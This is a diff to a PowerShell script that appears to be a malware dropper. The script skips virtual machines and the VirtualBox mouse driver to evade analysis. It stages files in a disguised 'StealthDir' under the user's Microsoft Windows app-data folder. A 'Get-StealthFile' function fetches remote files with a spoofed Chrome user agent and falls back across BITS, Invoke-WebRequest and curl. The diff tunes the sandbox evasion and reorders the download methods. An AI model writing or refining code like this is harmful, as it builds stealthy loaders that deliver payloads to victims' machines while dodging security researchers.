@@ -12,7 +12,7 @@ $StealthDir = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Microsoft", "Windows
 
 # ANTI-ANALYSIS & POWER GUARD
 $Check = try { @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " " } catch { "" }
-if ($Check -match "VirtualBox" -or $Check -match "VMware" -or $Check -match "VIRTUAL") { exit }
+if ($Check -match "VirtualBox" -or $Check -match "VMware") { exit } # Specific VM only
 if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }
 
 try {
@@ -21,19 +21,15 @@ try {
 } catch { }
 
 function Get-StealthFile($Url, $Path) {
+    if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
     $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     for ($i = 0; $i -lt 3; $i++) {
-        if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
-        try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null } catch {
-            try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null } catch {
-                try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path -ErrorAction SilentlyContinue } catch { }
+        try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path -ErrorAction Stop; return $true } catch {
+            try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null; return $true } catch {
+                try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null; if (Test-Path $Path) { return $true } } catch { }
             }
         }
-        if (Test-Path $Path) {
-            $Size = (Get-Item $Path).Length
-            if ($Size -gt 100kb) { return $true } # Make sure we didn't just download a 404 page
-        }
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 5
     }
     return $false
 }
